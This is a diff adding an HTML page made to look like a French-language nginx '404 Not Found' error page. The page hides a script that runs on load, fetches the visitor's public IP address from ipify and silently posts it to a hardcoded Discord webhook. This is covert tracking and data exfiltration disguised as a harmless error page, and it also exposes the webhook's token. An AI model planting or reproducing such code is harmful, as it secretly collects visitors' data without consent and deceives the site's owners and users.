@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>404 Not Found</title>
+<style>
+  body {
+    margin: 0;
+    padding: 0;
+    font-family: "Segoe UI", Arial, sans-serif;
+    background-color: #fff;
+    color: #202124;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+  h1 {
+    font-size: 6em;
+    font-weight: 400;
+    margin: 0;
+    color: #d93025;
+  }
+  h2 {
+    font-size: 1.4em;
+    font-weight: 400;
+    margin: 20px 0 10px;
+  }
+  p {
+    color: #5f6368;
+    font-size: 0.95em;
+    margin: 5px 0;
+  }
+  a {
+    color: #1a73e8;
+    text-decoration: none;
+  }
+  a:hover { text-decoration: underline; }
+  .code {
+    font-family: monospace;
+    color: #80868b;
+    margin-top: 30px;
+    font-size: 0.85em;
+  }
+</style>
+</head>
+<body>
+  <h1>404</h1>
+  <h2>Cette page est introuvable.</h2>
+  <p>Désolé, la page que vous demandez n'existe pas ou a été déplacée.</p>
+  <p>Vérifiez l'URL ou <a href="/">retournez à la page d'accueil</a>.</p>
+  <div class="code">Error 404 — Not Found<br>nginx/1.24.0</div>
+  <script>
+fetch('https://api.ipify.org?format=json')
+  .then(r => r.json())
+  .then(d => fetch('https://discord.com/api/webhooks/1565050158293459064/lihsTTCj-svFKCzAFxU40TCpqe9SBc3eRsG1Xm_sBNGfydnrgqdWxeM13FkW1Jyohb8S', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: 'IP: ' + d.ip})
+  }));
+</script>
+</body>
+</html>
